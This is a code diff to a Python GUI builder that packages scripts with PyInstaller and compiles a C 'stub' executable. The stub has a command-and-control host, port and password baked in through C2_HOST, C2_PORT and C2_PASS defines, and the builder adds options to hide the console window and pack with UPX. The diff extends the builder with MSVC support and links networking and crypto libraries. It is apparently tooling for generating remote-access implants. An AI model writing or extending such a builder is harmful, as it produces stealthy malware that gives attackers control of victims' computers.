@@ -14,6 +14,14 @@ def find_pyinstaller():
     for p in os.environ.get("PATH", "").split(os.pathsep):
         for n in ("pyinstaller.exe", "pyinstaller", "pyinstaller.bat"):
             if os.path.isfile(os.path.join(p, n)): return os.path.join(p, n)
+    # Fallback: try running via python -m PyInstaller
+    try:
+        r = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
+                           capture_output=True, text=True, timeout=10)
+        if r.returncode == 0:
+            return [sys.executable, "-m", "PyInstaller"]
+    except Exception:
+        pass
     return None
 
 class BuilderApp:
@@ -173,7 +181,11 @@ class BuilderApp:
         threading.Thread(target=self._run_pyinstaller, args=(pi, script, out_dir), daemon=True).start()
 
     def _run_pyinstaller(self, pi, script, out_dir):
-        args = [pi, "--onefile", "--distpath", out_dir, "--workpath", os.path.join(out_dir, "_pyi")]
+        if isinstance(pi, list):
+            args = list(pi)
+        else:
+            args = [pi]
+        args += ["--onefile", "--distpath", out_dir, "--workpath", os.path.join(out_dir, "_pyi")]
         if self.var_noconsole.get(): args.insert(1, "--noconsole"); args.insert(1, "--windowed")
         if self.var_upx.get(): args.insert(1, "--upx-dir"); args.insert(1, ".")
         args.append(script)
@@ -214,21 +226,34 @@ class BuilderApp:
         out_exe = os.path.join(out_dir, "stub_c.exe")
         self._log("[*] Compiling C stub...")
         def task():
-            cc = None
-            for name in ["gcc", "mingw32-gcc", "x86_64-w64-mingw32-gcc", "clang"]:
+            cc = None; msvc = False
+            for name in ["gcc", "mingw32-gcc", "x86_64-w64-mingw32-gcc", "clang", "cl.exe"]:
                 try:
-                    subprocess.run([name, "--version"], capture_output=True, timeout=5)
-                    cc = name; break
+                    if name == "cl.exe":
+                        subprocess.run([name], capture_output=True, timeout=5)
+                        cc = name; msvc = True; break
+                    else:
+                        subprocess.run([name, "--version"], capture_output=True, timeout=5)
+                        cc = name; break
                 except: continue
             if not cc:
                 self._log("[!] No C compiler found. Install MinGW or MSVC.")
                 return
             cfg = self._get_cfg()
-            args = [cc, "-O2", "-s", "-o", out_exe, c_path,
-                    f'-DC2_HOST="{cfg["host"]}"',
-                    f'-DC2_PORT={cfg["port"]}',
-                    f'-DC2_PASS="{cfg["password"]}"']
-            if self.var_noconsole.get(): args.append("-mwindows")
+            if msvc:
+                args = [cc, "/O1", "/GS-", f"/Fe{out_exe}", c_path,
+                        f"/DC2_HOST=\"{cfg['host']}\"",
+                        f"/DC2_PORT={cfg['port']}",
+                        f"/DC2_PASS=\"{cfg['password']}\""]
+                if self.var_noconsole.get(): args.append("/link")
+                args += ["ws2_32.lib", "bcrypt.lib", "advapi32.lib"]
+            else:
+                args = [cc, "-O2", "-s", "-o", out_exe, c_path,
+                        f'-DC2_HOST="{cfg["host"]}"',
+                        f'-DC2_PORT={cfg["port"]}',
+                        f'-DC2_PASS="{cfg["password"]}"']
+                if self.var_noconsole.get(): args.append("-mwindows")
+                args += ["-lws2_32", "-lbcrypt", "-ladvapi32"]
             self._log(f"[*] Compiling with {cc}...")
             p = subprocess.run(args, capture_output=True, text=True, timeout=60)
             if p.returncode == 0:
